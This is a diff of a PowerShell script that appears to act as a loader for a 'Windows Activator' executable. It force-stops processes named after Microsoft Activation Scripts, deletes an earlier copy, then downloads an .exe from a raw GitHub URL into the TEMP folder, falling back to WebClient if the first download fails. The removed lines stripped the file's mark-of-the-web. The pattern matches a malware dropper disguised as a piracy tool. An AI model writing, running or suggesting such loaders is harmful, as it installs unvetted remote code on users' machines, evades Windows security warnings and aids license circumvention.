@@ -2,24 +2,26 @@ $url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/m
 $tempFile = "$env:TEMP\Windows_Activator.exe"
 
 
-if (Test-Path $tempFile) {
-    try {
-        Stop-Process -Name "Microsoft Activation Scripts" -ErrorAction SilentlyContinue
-        Stop-Process -Name "MAS" -ErrorAction SilentlyContinue
-        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Milliseconds 500
-    }
-    catch {}
+$processNames = @("Microsoft Activation Scripts", "MAS", "Windows_Activator", "Activator")
+foreach ($name in $processNames) {
+    Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 }
 
 
-Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "PowerShell"
+Start-Sleep -Milliseconds 500
+
+
+if (Test-Path $tempFile) {
+    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 300
+}
 
 
 try {
-    Unblock-File -Path $tempFile
+    Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "PowerShell"
 } catch {
-    Remove-Item "$tempFile:Zone.Identifier" -Force -ErrorAction SilentlyContinue
+
+    (New-Object System.Net.WebClient).DownloadFile($url, $tempFile)
 }
 
 
